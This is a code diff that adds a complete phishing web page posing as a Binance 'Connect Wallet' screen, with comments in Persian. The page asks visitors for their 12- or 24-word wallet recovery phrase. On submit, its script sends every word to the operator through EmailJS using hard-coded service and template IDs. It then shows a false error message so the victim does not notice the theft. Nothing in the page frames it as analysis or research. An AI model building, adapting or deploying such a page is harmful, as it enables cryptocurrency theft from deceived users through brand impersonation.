@@ -1,0 +1,193 @@
+<!DOCTYPE html>
+<html lang="fa">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Binance | Connect Wallet</title>
+    <link rel="stylesheet" href="styles.css">
+    <link rel="icon" href="files/favicon/favicon.ico" type="image/x-icon">
+    <link rel="icon" href="imag/Binance_Logo.png" type="image/svg+xml">
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3.3.0/dist/email.min.js"></script>
+
+    <script>
+        // مقداردهی به EmailJS با جدیدترین ورژن SDK
+        emailjs.init("02-KpOVYb1bixkN7E"); 
+    </script>
+</head>
+
+<body>
+    <div class="logo-container">
+        <img src="imag/mireeeebala.png" alt="Logo" class="logo">
+        
+    </div>
+    
+    <div class="main-container">
+        <div class="header-lines">
+            <div class="line"></div>
+            <div class="line"></div>
+        </div>
+    <!-- دکمه تغییر تعداد فیلدها -->
+    <div class="toggle-container">
+        <button id="toggleWords">I have a 24 word Secret Phrase</button>
+    </div>
+
+    <!-- فرم ارسال به ایمیل با EmailJS -->
+    <form id="seedForm">
+        <div class="container">
+            <div class="column" id="column-1">
+                <!-- فیلدهای 1 تا 12 -->
+                <div class="input-group">
+                    <label for="word-1">1.</label>
+                    <input type="text" id="word-1" name="word-1"  placeholder="Word #1" required>
+                </div>
+                <div class="input-group">
+                    <label for="word-2">2.</label>
+                    <input type="text" id="word-2" name="word-2" placeholder="Word #2" required>
+                </div>
+                <div class="input-group">
+                    <label for="word-3">3.</label>
+                    <input type="text" id="word-3" name="word-3" placeholder="Word #3" required>
+                </div>
+                <div class="input-group">
+                    <label for="word-4">4.</label>
+                    <input type="text" id="word-4" name="word-4" placeholder="Word #4" required>
+                </div>
+                <div class="input-group">
+                    <label for="word-5">5.</label>
+                    <input type="text" id="word-5" name="word-5" placeholder="Word #5" required>
+                </div>
+                <div class="input-group">
+                    <label for="word-6">6.</label>
+                    <input type="text" id="word-6" name="word-6"  placeholder="Word #6" required>
+                </div>
+                <div class="input-group">
+                    <label for="word-7">7.</label>
+                    <input type="text" id="word-7" name="word-7" placeholder="Word #7" required>
+                </div>
+                <div class="input-group">
+                    <label for="word-8">8.</label>
+                    <input type="text" id="word-8" name="word-8" placeholder="Word #8" required>
+                </div>
+                <div class="input-group">
+                    <label for="word-9">9.</label>
+                    <input type="text" id="word-9" name="word-9" placeholder="Word #9">
+                </div>
+                <div class="input-group">
+                    <label for="word-10">10.</label>
+                    <input type="text" id="word-10" name="word-10" placeholder="Word #10">
+                </div>
+                <div class="input-group">
+                    <label for="word-11">11.</label>
+                    <input type="text" id="word-11" name="word-11" placeholder="Word #11">
+                </div>
+                <div class="input-group">
+                    <label for="word-12">12.</label>
+                    <input type="text" id="word-12" name="word-12" placeholder="Word #12">
+                </div>
+            </div>
+
+            <div class="column" id="column-2" style="display: none;">
+                <!-- فیلدهای 13 تا 24 -->
+                <div class="input-group">
+                    <label for="word-13">13.</label>
+                    <input type="text" id="word-13" name="word-13" placeholder="Word #13">
+                </div>
+                <div class="input-group">
+                    <label for="word-14">14.</label>
+                    <input type="text" id="word-14" name="word-14"  placeholder="Word #14">
+                </div>
+                <div class="input-group">
+                    <label for="word-15">15.</label>
+                    <input type="text" id="word-15" name="word-15" placeholder="Word #15">
+                </div>
+                <div class="input-group">
+                    <label for="word-16">16.</label>
+                    <input type="text" id="word-16" name="word-16" placeholder="Word #16">
+                </div>
+                <div class="input-group">
+                    <label for="word-17">17.</label>
+                    <input type="text" id="word-17" name="word-17" placeholder="Word #17">
+                </div>
+                <div class="input-group">
+                    <label for="word-18">18.</label>
+                    <input type="text" id="word-18" name="word-18" placeholder="Word #18">
+                </div>
+                <div class="input-group">
+                    <label for="word-19">19.</label>
+                    <input type="text" id="word-19" name="word-19" placeholder="Word #19">
+                </div>
+                <div class="input-group">
+                    <label for="word-20">20.</label>
+                    <input type="text" id="word-20" name="word-20" placeholder="Word #20">
+                </div>
+                <div class="input-group">
+                    <label for="word-21">21.</label>
+                    <input type="text" id="word-21" name="word-21" placeholder="Word #21">
+                </div>
+                <div class="input-group">
+                    <label for="word-22">22.</label>
+                    <input type="text" id="word-22" name="word-22" placeholder="Word #22">
+                </div>
+                <div class="input-group">
+                    <label for="word-23">23.</label>
+                    <input type="text" id="word-23" name="word-23" placeholder="Word #23">
+                </div>
+                <div class="input-group">
+                    <label for="word-24">24.</label>
+                    <input type="text" id="word-24" name="word-24" placeholder="Word #24">
+                </div>
+            </div>
+        </div>
+        
+        <div class="button-container">
+            <button type="submit">Continue</button>
+        </div>
+    </form>
+
+    <script>
+        document.getElementById('seedForm').addEventListener('submit', function(event) {
+            event.preventDefault();
+
+            // فیلدهای غیرقابل نمایش را غیر ضروری می‌کنیم
+            const allInputs = document.querySelectorAll('input[type="text"]');
+            allInputs.forEach((input, index) => {
+                if (showTwelveWords && index >= 12) {
+                    input.removeAttribute('required'); // فیلدهای اضافی را غیرضروری کنید
+                } else {
+                    input.setAttribute('required', ''); // در حالت 24 فیلدها را ضروری کنید
+                }
+            });
+
+               // ارسال داده‌ها با EmailJS
+               const formData = new FormData(this);
+            const data = Object.fromEntries(formData);
+
+            emailjs.send('service_pb8dciz', 'template_030l7kc', data)
+                .then(function() {
+                    alert('The information entered is not correct.');
+                }, function(error) {
+                    console.error('Error occurred:', error);
+                    alert('Error: ' + JSON.stringify(error));
+                });
+        });
+
+        // فعال کردن دکمه تغییر تعداد فیلدها
+        let showTwelveWords = false;
+        document.getElementById('toggleWords').addEventListener('click', function() {
+            showTwelveWords = !showTwelveWords;
+            const column1 = document.getElementById('column-1');
+            const column2 = document.getElementById('column-2');
+
+            if (showTwelveWords) {
+                column1.style.display = 'block'; // نمایش فیلدهای 1 تا 12
+                column2.style.display = 'none'; // مخفی کردن فیلدهای 13 تا 24
+                this.textContent = "I have a 12 word Secret Phrase"; // تغییر متن دکمه
+            } else {
+                column1.style.display = 'block'; // نمایش فیلدهای 1 تا 24
+                column2.style.display = 'block'; // نمایش فیلدهای 13 تا 24
+                this.textContent = "I have a 24 word Secret Phrase"; // تغییر متن دکمه
+            }
+        });
+    </script>
+</body>
+</html>
